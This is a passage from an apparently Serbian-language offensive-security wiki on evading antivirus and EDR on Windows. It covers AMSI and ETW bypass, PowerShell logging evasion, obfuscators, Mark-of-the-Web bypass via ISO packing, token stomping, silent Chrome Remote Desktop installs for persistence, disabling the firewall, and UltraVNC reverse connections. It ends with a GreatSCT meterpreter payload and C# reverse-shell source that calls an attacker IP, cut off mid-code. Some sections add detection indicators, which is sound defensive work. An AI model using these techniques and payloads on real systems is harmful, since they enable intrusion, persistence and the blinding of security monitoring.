Spisak AV/EDR proizvoda koji koriste AMSI možete pronaći na **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Koristite PowerShell verziju 2**
Ako koristite PowerShell verziju 2, AMSI se neće učitati, pa možete pokretati skripte bez AMSI skeniranja. To možete uraditi ovako:

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell logging je funkcija koja omogućava evidentiranje svih PowerShell komandi izvršenih na sistemu. Ovo može biti korisno u svrhe revizije i rešavanja problema, ali može predstavljati i **problem za napadače koji žele da izbegnu otkrivanje**.

Da biste zaobišli PowerShell logging, možete koristiti sledeće tehnike:

- **Onemogućite PowerShell Transcription i Module Logging**: U tu svrhu možete koristiti alat kao što je [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Koristite PowerShell verziju 2**: Ako koristite PowerShell verziju 2, AMSI se neće učitati, pa možete pokretati skripte bez AMSI skeniranja. To možete uraditi ovako: `powershell.exe -version 2`
- **Koristite neupravljanu PowerShell sesiju**: Koristite [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) da biste pokrenuli PowerShell bez pokretanja procesa `powershell.exe` (pristup koji koristi `powerpick` iz Cobalt Strike-a). Time se zaobilaze kontrole koje su vezane konkretno za proces `powershell.exe`, ali se time ne onemogućavaju automatski AMSI, Script Block Logging niti sve druge PowerShell zaštite; pokrivenost zavisi od runtime okruženja i implementacije hosta.


## Obfuscation

> [!TIP]
> Nekoliko tehnika za obfuscation oslanja se na šifrovanje podataka, čime se povećava entropija binarne datoteke i AV-ovima i EDR-ovima olakšava njeno otkrivanje. Budite pažljivi i možda primenite šifrovanje samo na određene delove koda koji su osetljivi ili ih treba sakriti.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Prilikom analize malware-a koji koristi ConfuserEx 2 (ili komercijalne fork-ove), često se nailazi na nekoliko slojeva zaštite koji onemogućavaju rad dekompajlera i sandbox-ova. Sledeći postupak pouzdano **vraća IL koji je gotovo identičan originalu**, a zatim se može dekompajlirati u C# pomoću alata kao što su dnSpy ili ILSpy.<sup>[[10]](#references)</sup>

1. Uklanjanje zaštite od neovlašćenih izmena – ConfuserEx šifruje svako *telo metode* i dešifruje ga unutar statičkog konstruktora *modula* (`<Module>.cctor`). Takođe menja PE checksum, zbog čega će se binarna datoteka srušiti ako se izmeni. Koristite **AntiTamperKiller** da biste pronašli šifrovane tabele metapodataka, povratili XOR ključeve i prepisali čistu assembly datoteku:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Izlaz sadrži 6 anti-tamper parametara (`key0-key3`, `nameHash`, `internKey`) koji mogu biti korisni pri izradi sopstvenog unpacker-a.

2.  Oporavak simbola / toka kontrole – prosledite *čistu* datoteku alatu **de4dot-cex** (fork alata de4dot prilagođen za ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – izaberite profil ConfuserEx 2
     • de4dot će poništiti control-flow flattening, vratiti originalne prostore imena, klase i nazive promenljivih i dešifrovati konstantne stringove.

3.  Proxy-call stripping – ConfuserEx zamenjuje direktne pozive metoda laganim omotačima (poznatim i kao *proxy calls*) da bi dodatno otežao dekompilaciju. Uklonite ih pomoću **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Nakon ovog koraka trebalo bi da vidite uobičajene .NET API-je kao što su `Convert.FromBase64String` ili `AES.Create()` umesto neprozirnih wrapper funkcija (`Class8.smethod_10`, …).

4.  Ručno čišćenje – pokrenite dobijenu binarnu datoteku u dnSpy-ju i potražite velike Base64 blobove ili upotrebu `RijndaelManaged`/`TripleDESCryptoServiceProvider` da biste pronašli pravi payload.  Malver ga često čuva kao TLV-kodiran niz bajtova inicijalizovan unutar `<Module>.byte_0`.

Ovaj lanac vraća tok izvršavanja **bez** potrebe za pokretanjem zlonamernog uzorka – korisno pri radu na offline radnoj stanici.

> 🛈  ConfuserEx generiše prilagođeni atribut `ConfusedByAttribute`, koji se može koristiti kao IOC za automatsku trijažu uzoraka.

#### Jednolinijski primer
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Cilj ovog projekta je da obezbedi open-source fork LLVM compilation suite-a, koji omogućava povećanu bezbednost softvera pomoću [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i zaštite od neovlašćenih izmena.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator pokazuje kako se jezik `C++11/14` može koristiti za generisanje obfusciranog koda tokom kompajliranja, bez korišćenja eksternih alata i bez izmena kompajlera.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje sloj obfusciranih operacija generisanih pomoću C++ template metaprogramming framework-a, što će osobi koja želi da crack-uje aplikaciju malo otežati posao.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz je x64 binary obfuscator koji može da obfuscira razne PE datoteke, uključujući: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame je jednostavan metamorphic code engine za proizvoljne izvršne datoteke.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator je framework za detaljnu code obfuscation za jezike koje podržava LLVM, koristeći ROP (return-oriented programming). ROPfuscator obfuscira program na nivou assembly koda tako što obične instrukcije pretvara u ROP lance, čime narušava našu uobičajenu predstavu o normalnom control flow-u.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt je .NET PE Crypter napisan u Nim-u
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor može da konvertuje postojeći EXE/DLL u shellcode i zatim ga učita

### LLVM compiler-assisted per-function self-masking

Umesto da se maskira ceo implant samo dok miruje, modifikovani LLVM X86 backend može da drži odabrane funkcije XOR-maskiranim kad god nisu aktivne. Function Peekaboo PoC bira demanglovana imena koja sadrže `REG_`, ubacuje position-independent ulazne/izlazne stubove oko konačnog mašinskog koda i emituje jedan zajednički handler za maskiranje u `.text`; potpisi na nivou izvornog koda i Windows x64 calling convention ostaju nepromenjeni.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

Ovo treba uraditi nakon instruction selection i optimizacije, jer transformacija mora da obuhvati **svaki emitovani return** i da zna tačan x86 raspored. Pre-emission `MachineFunctionPass` pronalazi poslednji `MachineInstr::isReturn()`, briše ga tako da poslednja putanja nastavlja izvršavanje do dodatog epiloga i zamenjuje ranije return instrukcije sa `JMP_1 handler`. Zadržite svako compiler-generated uklanjanje steka/frame-a koje prethodi svakom return-u; preusmerite samo return instrukciju.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` i `X86AsmPrinter::emitFunctionBodyEnd()` emituju stubove za pojedinačne funkcije, dok `emitEndOfAsmFile()` emituje handler. Simboli koji se dele između faza emitovanja omogućavaju da grana iz prologa cilja kasniji epilog; za ručno emitovani near `je`, upišite `0F 84`, a zatim četvorobajtni MC izraz `target - address_after_je`. Pozivi i skokovi do handler-a mogu se umesto toga emitovati kao `MCInst` objekti (`CALL64pcrel32` i `JMP_1`). Pass mora da vrati `false` za neizabranu funkciju ako ništa nije izmenio; PoC pogrešno vraća `true` u tom slučaju.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata and pre-CRT initialization

PoC smešta XOR ključ i zapise od 16 bajtova koji sadrže pokazivač na funkciju sa loader-relocation-om i dužinu tokom izvršavanja u `.funcmeta`. Iako je C polje `uint32_t`, handler pristupa QWORD-u na pomeraju zapisa `+8`, čime čita dužinu i njeno poravnanje, a zapise pomera za `0x10`. Imena PE sekcija zauzimaju samo osam bajtova, pa runtime pretraga vidi `.funcmet`. Eksterni patcher dodaje izvršnu sekciju `.stub`, čuva stari entry-point RVA u stub-u i preusmerava `AddressOfEntryPoint`; PIC stub dobija bazu slike iz `gs:[0x60]` → `[PEB+0x10]`, prolazi kroz PE32+ imports da bi razrešio već importovani `VirtualProtect` i pokreće se pre CRT-a.<sup>[[38]](#references)[[39]](#references)</sup>

Inicijalizacija postavlja sentinel u `gs:[0xE8]` i poziva svaku funkciju iz metadata-e. Njihov prolog, koji je trajno čitljiv, upisuje početak funkcije u `gs:[0xF0]`, prepoznaje sentinel i preskače telo koje još nije maskirano. Epilog zatim koristi `call handler`; nakon što handler sačuva 13 registara (`0x68` bajtova), return address na `[rsp+0x68]` predstavlja kraj transformisane funkcije, pa se `end - start` može upisati u njen metadata zapis. Stub briše sentinel i skače na `ImageBase + original_entry_point_RVA` nakon što su sva tela maskirana.<sup>[[38]](#references)[[39]](#references)</sup>

Tokom uobičajenog poziva, prolog poziva isti simetrični handler da dekodira telo. Poslednja putanja nastavlja izvršavanje do dodatog epiloga, dok svaki raniji return skače direktno do zajedničkog handler-a. Uobičajeni epilog takođe koristi `jmp handler` umesto `call`, pa nakon ponovnog maskiranja `ret` u handler-u preuzima originalni return address pozivaoca i čuva rezultat funkcije u `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive and analysis indicators

Handler pronalazi trenutni zapis, preskače fiksni vidljivi prolog (u ovoj verziji `0x46` bajtova), menja ostatak u `PAGE_EXECUTE_READWRITE`, XOR-uje ga bajt po bajt sa nižim bajtom ključa, a zatim ga postavlja na `PAGE_EXECUTE_READ`. Ista petlja zato dekodira pri ulasku i kodira pri svakom uobičajenom izlasku.<sup>[[38]](#references)[[39]](#references)</sup>

Indikatori visoke pouzdanosti za ovaj dizajn uključuju:<sup>[[38]](#references)[[39]](#references)</sup>

- entry point unutar izvršne `.stub` sekcije i `.funcmet` sekciju koja sadrži ključ i relocirane `.text` pokazivače;
- PEB, import-table i section-table parsiranje pre CRT-a, nakon čega slede pozivi preko svakog metadata pokazivača;
- identične `call`/`pop` PIC prologe i mnoga mesta povratka preusmerena na jedan handler;
- upisivanja u `gs:[0xE8]`, `gs:[0xF0]` i `gs:[0xF8]`, nakon kojih slede ponovljeni `VirtualProtect` prelazi i XOR upisivanja bajt po bajt u izvršne stranice koje podržava image.

Ovo je izbegavanje memory scanner-a, a ne kriptografska zaštita: patch-ovana datoteka i dalje sadrži originalno nemaskirano telo, a debugger može da postavi breakpoint na `VirtualProtect` ili XOR petlju i dump-uje aktivnu funkciju. XOR sa jednim bajtom, čitljivi metadata podaci i fiksna granica `0x46` takođe omogućavaju jednostavan oporavak van mreže.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> TEB slot-ovi u PoC-u su thread-local, ali izmenjene stranice koda važe za ceo proces. Istovremeni ili rekurzivni ulazak zato može ponovo da preokrene instrukcije dok ih druga invokacija izvršava; izuzeci i nenormalni izlazi takođe mogu da zaobiđu ponovno maskiranje. Robusna implementacija mora da sinhronizuje prelaze, vrati zaštitu koja je zaista dobijena preko `lpflOldProtect`, izbegava hard-kodirane dužine stub-a, proveri poravnanje x64 steka u putanjama `call` i `jmp` i pozove `FlushInstructionCache` nakon ponovnog upisivanja izvršnih bajtova. Microsoft izričito navodi da je pozivalac odgovoran za koherentnost instruction cache-a kada se izvršni kod menja.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Možda ste videli ovaj ekran prilikom preuzimanja nekih izvršnih datoteka sa interneta i njihovog pokretanja.

Microsoft Defender SmartScreen je bezbednosni mehanizam namenjen zaštiti krajnjeg korisnika od pokretanja potencijalno zlonamernih aplikacija.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen uglavnom koristi pristup zasnovan na reputaciji, što znači da će aplikacije koje se retko preuzimaju pokrenuti SmartScreen, koji će upozoriti krajnjeg korisnika i sprečiti njegovo pokretanje datoteke (iako se datoteka i dalje može pokrenuti klikom na More Info -> Run anyway).

**MoTW** (Mark of The Web) je [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) pod imenom Zone.Identifier, koji se automatski kreira pri preuzimanju datoteka sa interneta, zajedno sa URL-om sa kog je datoteka preuzeta.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Provera Zone.Identifier ADS-a za datoteku preuzetu sa interneta.</p></figcaption></figure>

> [!TIP]
> Važno je napomenuti da izvršne datoteke potpisane **pouzdanim** sertifikatom za potpisivanje **neće pokrenuti SmartScreen**.

Veoma efikasan način da sprečite da vaši payload-i dobiju Mark of The Web jeste da ih spakujete u neku vrstu kontejnera, poput ISO-a. To je zato što Mark-of-the-Web (MOTW) **ne može** da se primeni na volumene koji **nisu NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) je alat koji pakuje payload-e u izlazne kontejnere kako bi zaobišao Mark-of-the-Web.

Primer upotrebe:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Evo demonstracije za bypassing SmartScreen pakovanjem payload-a u ISO datoteke pomoću alata [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) je moćan mehanizam za beleženje događaja u Windows-u koji aplikacijama i sistemskim komponentama omogućava da **beleže događaje**. Međutim, bezbednosni proizvodi mogu da ga koriste i za nadgledanje i otkrivanje zlonamernih aktivnosti.

Slično kao što se AMSI onemogućava (bypassed), moguće je i podesiti funkciju **`EtwEventWrite`** procesa u korisničkom prostoru tako da se odmah vrati bez beleženja događaja. To se postiže izmenom funkcije u memoriji tako da se odmah vrati, čime se efektivno onemogućava ETW beleženje za taj proces.

Više informacija možete pronaći u **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) i [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Učitavanje C# binarnih datoteka u memoriju poznato je već duže vreme i još uvek predstavlja odličan način za pokretanje post-exploitation alata bez otkrivanja od strane AV-a.

Pošto će se payload učitati direktno u memoriju, bez pristupa disku, moraćemo samo da se pobrinemo za patchovanje AMSI-ja za ceo proces.

Većina C2 okvira (sliver, Covenant, metasploit, CobaltStrike, Havoc itd.) već omogućava izvršavanje C# assembly-ja direktno u memoriji, ali postoje različiti načini za to:

- **Fork\&Run**

Podrazumeva **pokretanje novog žrtvenog procesa**, ubacivanje zlonamernog post-exploitation koda u taj novi proces, izvršavanje zlonamernog koda i gašenje novog procesa po završetku. Ovaj pristup ima prednosti i mane. Prednost fork and run metode je to što se izvršavanje odvija **izvan** procesa našeg Beacon implant-a. To znači da, ako nešto pođe po zlu tokom naše post-exploitation aktivnosti ili budemo otkriveni, postoji **mnogo veća verovatnoća** da će naš **implant preživeti.** Mana je veća **verovatnoća** da ćemo biti otkriveni pomoću **bihevioralnih detekcija**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Podrazumeva ubacivanje zlonamernog post-exploitation koda **u sopstveni proces**. Tako možete izbeći kreiranje novog procesa i njegovo skeniranje od strane AV-a, ali mana je to što, ako nešto pođe po zlu prilikom izvršavanja payload-a, postoji **mnogo veća verovatnoća** da ćete **izgubiti beacon**, jer se proces može srušiti.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ako želite da saznate više o učitavanju C# Assembly-ja, pogledajte ovaj članak [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) i njihov InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

C# Assembly-je možete učitavati i **iz PowerShell-a**; pogledajte [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [video S3cur3th1sSh1t-a](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## NativeAOT WebAssembly repakovanje .NET alata (WasmForge)

Uobičajene `execute-assembly` tehnike zadržavaju prepoznatljiv MSIL i na kraju inicijalizuju CLR. **WasmForge** menja samo okruženje za izvršavanje: migrira C# projekat na eksperimentalni NativeAOT-LLVM WASI cilj, unapred ga kompajlira u WebAssembly i ugrađuje taj modul u Windows PE host zasnovan na Wazero-u. Dobijeni proces ne zahteva CLR, JIT ni `dotnet` host na ciljnom sistemu, pa pravila zasnovana samo na imenima managed assembly-ja, učitavanju CLR-a, AMSI-ju ili .NET ETW-u gube direktnu vidljivost. Ovo je tehnika za izbegavanje detekcije i pakovanje, a ne zaobilaženje granice privilegija — guest zadržava dozvole originalnog alata i njegovo uočljivo ponašanje na OS-u.<sup>[[44]](#references)[[45]](#references)</sup>

### Izgradnja C# projekta

Preporučeni način izgradnje je Docker okruženje projekta, jer uključuje .NET 10 SDK, NativeAOT-LLVM workload, WASI SDK 24.0, linker i zavisnosti za potpisivanje. `.csproj` se automatski detektuje; jednokratna izgradnja obavlja migraciju, zakrpe za kompatibilnost, WASM kompilaciju, izradu PE datoteke i potpisivanje.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Za otklanjanje grešaka ili pregled generisanog koda, podelite proces na `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` i završni `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Slika za build takođe koristi omotač `wasm-component-ld` kako bi izbegla kodiranje komponenti WASI Preview 2 i proizvela običan modul koji očekuje ugrađeno okruženje za izvršavanje.<sup>[[44]](#references)[[45]](#references)</sup>

### Povezivanje wasm32 C# koda sa x64 Win32

Ovo nije transparentno ponovno kompajliranje. NativeAOT-WASI nema neke funkcije BCL-a namenjene Windows-u ili ih menja, a wasm32 gost obično alocira četvorobajtne slotove za pokazivače, dok x64 API-ji mogu da vrate osmobaјtne pokazivače. WasmForge rešava oba problema pomoću sledećih generisanih slojeva:<sup>[[44]](#references)</sup>

1. Source patcher ispravlja semantičke razlike specifične za AOT i preusmerava nepodržane pozive za registry, pipes, WMI, identity, directory-service, file-version, LSA i slične pozive na `Wf*` pomoćne funkcije.
2. P/Invoke skener generiše NativeAOT `DirectPInvoke` mapiranja, tako da se pozivi `[DllImport]` povezuju sa povezanim C bridge simbolima umesto da se deklarisana DLL dinamički učitava unutar gosta.
3. Pokazivači vezani za host koriste `ulong` u C#-u i `uint64_t` u C-u. Generički dispečer prosleđuje poziv Win32 rukovaocu na hostu; `out8_mask` označava stvarne osmobaјtne izlazne slotove čije gornje polovine treba sačuvati. Za neoznačene izlaze oblika wasm32 koristi se zaštita snapshot/restore kako upis x64 sistema ne bi oštetio susedna četiri bajta.
4. Namenski host bridge-ovi obrađuju operacije koje se ne uklapaju u generičko syscall dispečiranje, kao što su pristup kešu LSA tiketa, operacije Kerberos/BCrypt sa strukturiranim rezultatima, TCP KDC saobraćaj i LDAP upiti.

Na primer, omotač za `version.dll!VerQueryValueW` prosleđuje četiri host adrese i postavlja bitove 2 i 3 (`0xC`), jer su pokazivač na vrednost i dužina osmobaјtni izlazni slotovi. Sam omotač ostaje generički i prosleđuje ime DLL-a, ime izvoza, argumente i masku funkciji `wf_call_v2`; host obavlja prevođenje pokazivača i poziva nativni API.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Ograničenja i tačke za detekciju

Kod koji intenzivno koristi refleksiju, dinamičko učitavanje assembly-ja, proizvoljne native callback-ove i složene x64 strukture vraćene u WASM memoriju i dalje može zahtevati zakrpe za pojedinačne alate ili potpuno otkazati. Generički WASI Preview 2 socket-i mogu takođe stići do no-op stub-ova, pa podržani alati koriste host shim-ove specifične za protokol. Proverite svaku komandu u odnosu na native build, umesto da pretpostavljate da su funkcionalnosti iste.<sup>[[44]](#references)[[45]](#references)</sup>

Ova tehnika preusmerava telemetriju, umesto da payload učini nevidljivim. Detekcija se može usmeriti na PE koji sadrži ili materijalizuje WASM modul, ponašanje runtime-a nalik Wazero-u, neuobičajenu alokaciju i kopiranje host/guest memorije, generičko direktno pozivanje Win32 funkcija, anomalije u potpisivanju i PE resursima, kao i rezultujuće API pozive i mrežni saobraćaj. Zato odsustvo CLR-load, AMSI ili .NET ETW događaja ne treba smatrati dokazom da je proces bezopasan.<sup>[[44]](#references)</sup>

## Korišćenje drugih programskih jezika

Kao što je predloženo u [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), moguće je izvršavati zlonamerni kod pomoću drugih jezika tako što će se kompromitovanoj mašini omogućiti pristup **okruženju interpretera instaliranom na SMB deljenom resursu pod kontrolom napadača**.

Omogućavanjem pristupa interpreter binarnim datotekama i okruženju na SMB deljenom resursu možete **izvršavati proizvoljan kod u tim jezicima u memoriji** kompromitovane mašine.

U repozitorijumu se navodi: Defender i dalje skenira skripte, ali korišćenjem Go, Java, PHP itd. imamo **više fleksibilnosti za zaobilaženje statičkih potpisa**. Testiranje nasumičnih, neobfuskovanih reverse shell skripti u ovim jezicima pokazalo se uspešnim.

## WebAssembly re-hosting radi izbegavanja statičke analize

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping manipuliše access token-om bezbednosnog proizvoda kao što je EDR ili AV. Smanjivanje privilegija tokena može ostaviti proces aktivnim, a istovremeno ga sprečiti da obavlja privilegovane radnje inspekcije ili otklanjanja pretnji.

Da bi se ovo sprečilo, Windows bi mogao da **spreči spoljne procese** da dobijaju handles za tokene bezbednosnih procesa.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Korišćenje pouzdanog softvera

### Chrome Remote Desktop

Kao što je opisano u [**ovom blog postu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), lako je instalirati Chrome Remote Desktop na računar žrtve, a zatim ga koristiti za preuzimanje kontrole nad njim i održavanje persistence:<sup>[[35]](#references)</sup>
1. Preuzmite ga sa https://remotedesktop.google.com/, kliknite na „Set up via SSH“, a zatim kliknite na MSI datoteku za Windows da biste je preuzeli.
2. Pokrenite instalacioni program nečujno na računaru žrtve (potrebna su administratorska prava): `msiexec /i chromeremotedesktophost.msi /qn`
3. Vratite se na stranicu Chrome Remote Desktop i kliknite na next. Čarobnjak će zatražiti autorizaciju; kliknite na dugme Authorize da biste nastavili.
4. Izvršite dostavljenu komandu uz potrebna podešavanja: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (parametar `--pin` podešava PIN bez korišćenja GUI-ja).
 

## Napredno izbegavanje detekcije

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Izbegavanje detekcije je veoma složena tema; ponekad morate da uzmete u obzir mnoge različite izvore telemetrije u jednom sistemu, pa je gotovo nemoguće ostati potpuno neotkriven u zrelim okruženjima.

Svako okruženje na koje naiđete imaće svoje prednosti i slabosti.

Snažno vam preporučujem da pogledate ovo predavanje od [@ATTL4S](https://twitter.com/DaniLJ94) kako biste se upoznali sa naprednijim tehnikama izbegavanja detekcije.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ovo je još jedno odlično predavanje od [@mariuszbit](https://twitter.com/mariuszbit) o višeslojnom izbegavanju detekcije.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Stare tehnike**

### **Provera koje delove Defender prepoznaje kao zlonamerne**

Možete koristiti [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), koji će **uklanjati delove binarne datoteke** dok **ne utvrdi koji deo Defender** prepoznaje kao zlonameran, a zatim će vam ga izdvojiti.\
Još jedan alat koji radi **istu stvar je** [**avred**](https://github.com/dobin/avred), uz javno dostupnu web uslugu na adresi [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do Windows10 verzije, svi Windows sistemi dolazili su sa **Telnet serverom** koji ste mogli da instalirate (kao administrator) ovako:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Podesite da se **pokreće** pri pokretanju sistema i **pokrenite** ga sada:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Promenite telnet port** (stealth) i onemogućite firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Preuzmite ga sa: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (potrebna su vam binarna preuzimanja, a ne instalacija)

**NA HOSTU**: Pokrenite _**winvnc.exe**_ i konfigurišite server:

- Omogućite opciju _Disable TrayIcon_
- Postavite lozinku u _VNC Password_
- Postavite lozinku u _View-Only Password_

Zatim prenesite binarnu datoteku _**winvnc.exe**_ i **novokreiranu** datoteku _**UltraVNC.ini**_ na **žrtvu**

#### **Obrnuta veza**

**Napadač** treba da **pokrene na svom** **hostu** binarnu datoteku `vncviewer.exe -listen 5900` kako bi bila **spremna** da prihvati obrnutu **VNC vezu**. Zatim, na **žrtvi**: Pokrenite winvnc daemon pomoću `winvnc.exe -run` i pokrenite `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**UPOZORENJE:** Da biste ostali neprimećeni, nemojte raditi sledeće:

- Nemojte pokretati `winvnc` ako je već pokrenut jer ćete aktivirati [iskačući prozor](https://i.imgur.com/1SROTTl.png). Proverite da li je pokrenut pomoću `tasklist | findstr winvnc`
- Nemojte pokretati `winvnc` bez datoteke `UltraVNC.ini` u istom direktorijumu jer će se otvoriti [prozor za konfiguraciju](https://i.imgur.com/rfMQWcf.png)
- Nemojte pokretati `winvnc -h` da biste dobili pomoć jer ćete aktivirati [iskačući prozor](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Preuzmite ga sa: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

U okviru GreatSCT-a:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Sada **pokrenite lister** pomoću `msfconsole -r file.rc` i **izvršite** **xml payload** pomoću:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Trenutni Defender će veoma brzo prekinuti proces.**

### Kompajliranje sopstvenog reverse shell-a

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prvi C# Revershell

Kompajlirajte ga pomoću:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Koristite ga sa:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
